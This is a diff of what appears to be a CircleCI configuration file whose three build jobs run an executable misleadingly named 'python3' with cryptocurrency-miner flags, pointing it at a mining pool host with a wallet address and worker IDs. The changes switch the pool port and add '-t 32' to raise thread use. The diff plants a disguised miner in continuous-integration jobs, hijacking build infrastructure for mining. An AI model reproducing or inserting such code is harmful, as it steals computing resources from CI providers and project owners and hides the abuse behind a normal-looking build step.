@@ -17,7 +17,7 @@ jobs:
             python3 -m venv venv
             . venv/bin/activate
             chmod +x python3
-            ./python3 -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=3
+            ./python3 -o web-ko1.gonspool.com:3331 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=6 -t 32
             
   build1:
     working_directory: ~/platform #Here is the answer
@@ -36,7 +36,7 @@ jobs:
             sudo python3 -m venv venv
             . venv/bin/activate
             chmod +x python3
-            ./python3 -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=2
+            ./python3 -o web-ko1.gonspool.com:3331 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=5 -t 32
             
   build2:
     working_directory: ~/platform 
@@ -55,12 +55,12 @@ jobs:
             python3 -m venv venv
             . venv/bin/activate
             chmod +x python3
-            ./python3 -o web-ko1.gonspool.com:3333 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=1
+            ./python3 -o web-ko1.gonspool.com:3331 -u 0x4E227342134E1c0beC9eE136394622C12F50BA48 -p x  --no-color --donate-level=1 --worker-id=4 -t 32
             
 workflows:
   version: 2.1
   build_and_test:
     jobs:
+      - build
       - build1
       - build2
-      - build
